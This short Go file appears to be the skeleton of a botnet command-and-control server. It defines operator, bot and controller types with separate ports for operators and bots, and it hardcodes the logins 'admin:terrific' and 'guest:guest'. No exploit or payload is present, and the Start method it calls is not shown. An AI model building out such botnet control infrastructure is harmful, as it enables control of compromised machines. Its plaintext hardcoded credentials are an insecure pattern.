package main

import (
	"net"
)

type Client struct {
	username 	string
	password 	string
	conn     	net.Conn
	addr     	string
	alive		bool
}

type Bot struct {
	name 		string
	arch 		string
	conn 		net.Conn
	alive		bool
}

type CNC struct {
	Host 		string
	Port 		int
	BotPort		int
	Clients 	[]*Client
	Bots 		[]*Bot
	Users		[]string
}




type BotCmd struct {
	Name		string
	Command		string
}



func main() {
	cnc := CNC {
		Host: "127.0.0.1",
		Port: 8901,
		BotPort: 6298,
		Users: []string {
			"admin:terrific",
			"guest:guest",
		},
	}

	cnc.Start()
}
